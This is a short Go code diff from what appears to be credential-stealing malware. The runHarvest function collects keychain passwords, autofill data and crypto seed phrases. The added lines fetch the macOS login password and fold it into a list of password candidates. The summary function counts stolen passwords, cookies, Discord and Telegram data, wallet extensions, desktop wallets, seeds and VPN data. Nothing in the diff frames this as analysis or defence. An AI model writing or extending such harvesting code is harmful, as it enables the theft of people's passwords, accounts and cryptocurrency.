@@ -56,6 +56,9 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
 	keychain := recovery.CollectKeychainPasswordCandidates()
 	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychain)
+	if mp := recovery.MacLoginPassword(); mp != "" {
+		result.PasswordCandidates = appendMacLoginCandidate(result.PasswordCandidates, mp)
+	}
 	result.PasswordCandidates = recovery.AppendExtraPasswordCandidates(result.PasswordCandidates, result)
 
 	return &harvestPayload{
@@ -107,6 +110,21 @@ func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl
 		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
 		"keys: " + itoa(keys) + " | telegram: " + itoa(tg) + " | apps: " + itoa(apps) + "\n" +
 		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
+}
+
+func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, password string) []recovery.PasswordCandidateResult {
+	seen := make(map[string]bool, len(candidates))
+	for _, c := range candidates {
+		seen[c.Password] = true
+	}
+	if !seen[password] {
+		candidates = append(candidates, recovery.PasswordCandidateResult{
+			Password: password,
+			Source:   "mac_login",
+			Detail:   "macOS user password",
+		})
+	}
+	return candidates
 }
 
 func itoa(n int) string {
